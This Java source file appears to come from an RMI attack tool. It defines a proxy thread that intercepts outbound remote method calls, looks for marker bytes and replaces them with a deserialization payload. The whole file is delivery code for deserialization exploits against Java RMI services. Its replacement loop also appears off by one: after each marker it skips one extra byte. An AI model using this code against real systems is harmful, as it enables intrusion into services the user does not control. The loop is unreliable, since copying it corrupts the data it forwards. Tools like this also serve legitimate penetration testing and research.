package nb.barmie.net.proxy.thread;

import java.io.ByteArrayOutputStream;
import java.net.Socket;

/***********************************************************
 * A proxy thread class that checks outbound remote method
 * invocations for marker bytes and replaces them with the
 * bytes of a deserialization payload.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class MethodCallPayloadInjectingProxyThread extends ProxyThread {
	/*******************
	 * Properties
	 ******************/
	private final byte[] _payload;	//The raw payload bytes to inject into remote method invocation packets
	private final byte[] _marker;	//The marker bytes to look for and replace in remote method invocation packets
	
	/*******************
	 * Construct the proxy thread.
	 * 
	 * @param srcSocket The source socket.
	 * @param dstSocket The destination socket.
	 * @param payload The raw bytes of the deserialization payload that will be injected into proxied method calls.
	 * @param marker The raw bytes of a marker object that will be replaced with the payload in proxied method calls.
	 ******************/
	public MethodCallPayloadInjectingProxyThread(Socket srcSocket, Socket dstSocket, byte[] payload, byte[] marker) {
		super(srcSocket, dstSocket);
		this._payload = payload;
		this._marker = marker;
	}
	
	/*******************
	 * Check the outbound packet for the marker bytes, if found then replace
	 * them with the payload bytes.
	 * 
	 * @param data The data received from the source socket.
	 * @return The data to write to the destination socket.
	 ******************/
	public ByteArrayOutputStream handleData(ByteArrayOutputStream data) {
		ByteArrayOutputStream out;
		boolean foundMarker;
		byte[] dataBytes;
		
		//Look for the marker in the packet whilst copying the packet to another output stream
		out = new ByteArrayOutputStream();
		dataBytes = data.toByteArray();
		for(int packetOffset = 0; packetOffset < dataBytes.length; ++packetOffset) {
			//Check for the marker if there is enough space left in the packet...
			if(dataBytes.length - packetOffset >= this._marker.length) {
				//Assume that the marker was found, if anything doesn't match this will be set to false
				foundMarker = true;
				for(int markerOffset = 0; markerOffset < this._marker.length; ++markerOffset) {
					if(dataBytes[packetOffset + markerOffset] != this._marker[markerOffset]) {
						foundMarker = false;
						break;
					}
				}
				
				//Check if the marker was found in the outbound packet
				if(foundMarker == true) {
					//Write the payload bytes out to the output stream
					for(int payloadOffset = 0; payloadOffset < this._payload.length; ++payloadOffset) {
						out.write((byte)this._payload[payloadOffset]);
					}
					
					//Advance the packet offset beyond the marker bytes so that this loop continues copying the remainder of the outbound method call bytes over
					packetOffset += this._marker.length;
				} else {
					//No marker found, just copy the current byte from input to output
					out.write((byte)dataBytes[packetOffset]);
				}
			} else {
				//Not enough space left in the packet, just copy bytes from input to output
				out.write((byte)dataBytes[packetOffset]);
			}
		}
		
		//Forward the output data
		return out;
	}
}
